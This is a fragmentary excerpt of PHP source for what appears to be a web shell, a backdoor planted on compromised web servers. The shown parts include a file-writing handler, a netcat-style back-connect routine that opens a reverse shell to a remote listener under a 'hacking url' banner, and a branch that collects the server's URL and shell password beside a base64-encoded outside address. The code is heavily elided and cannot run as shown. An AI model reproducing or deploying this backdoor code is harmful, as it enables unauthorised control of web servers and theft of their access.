...
switch($eanver){
	...
	if(!empty($_POST['newfile'])){
        ...
        if (substr(PHP_VERSION,0,1)>=5){if(($_POST['charset']=='GB2312') or ($_POST['charset']=='GBK')){}else{$txt = iconv("gb2312//IGNORE",$_POST['charset'],$txt);}}
...
END;
	...
	setcookie('yourport',$backport);
		...
		if($_POST['use'] == 'nc')
		{
		 ...
		 fputs ($fp ,"\n*********************************************\n 
		              hacking url:http://www.zjjv.com is ok!        
			          \n*********************************************\n\n");
	     while(!feof($fp)){ 
...
if(isset($_GET['login'])=='geturl'){
	...
	$serveru = $_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];
    $serverp = envlpass;
    $copyurl = base64_decode('aHR0cDovL3d3dy5iYWlkdS5jb20=');
...
function CheckDate(){
	...
	document.getElementById(\'txt\').value = base64encode(document.getElementById(\'txt\').value);document.getElementById(\'editor\').submit();}
}');
}elseif($num == "3"){
